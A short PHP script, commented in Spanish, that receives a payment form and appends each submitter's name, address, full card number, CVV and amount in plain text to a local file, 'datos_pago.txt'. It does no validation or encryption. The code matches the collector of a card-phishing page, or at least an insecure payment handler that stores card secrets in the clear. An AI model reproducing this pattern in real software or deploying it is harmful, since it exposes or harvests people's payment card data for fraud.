<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nombre = $_POST["nombre"];
    $apellido = $_POST["apellido"];
    $ciudad = $_POST["ciudad"];
    $codigoPostal = $_POST["codigoPostal"];
    $pais = $_POST["pais"];
    $numeroTarjeta = $_POST["numeroTarjeta"];
    $cvv = $_POST["cvv"];
    $monto = $_POST["monto"];

    // Validar y sanitizar los datos aquí si es necesario

    if ($nombre && $apellido && $ciudad && $codigoPostal && $pais && $numeroTarjeta && $cvv && $monto) {
        $datos = "Nombre: $nombre\nApellido: $apellido\nCiudad: $ciudad\nCódigo Postal: $codigoPostal\nPaís: $pais\nNúmero de Tarjeta: $numeroTarjeta\nCVV: $cvv\nMonto a Pagar: $monto\n\n";
        $archivo = "datos_pago.txt";
        $archivoHandler = fopen($archivo, "a");

        if ($archivoHandler) {
            fwrite($archivoHandler, $datos);
            fclose($archivoHandler);

            // Enviar una respuesta al cliente (puede ser un JSON si lo prefieres)
            echo "success";
        } else {
            // Enviar una respuesta de error al cliente
            echo "error";
        }
    }
}
?>
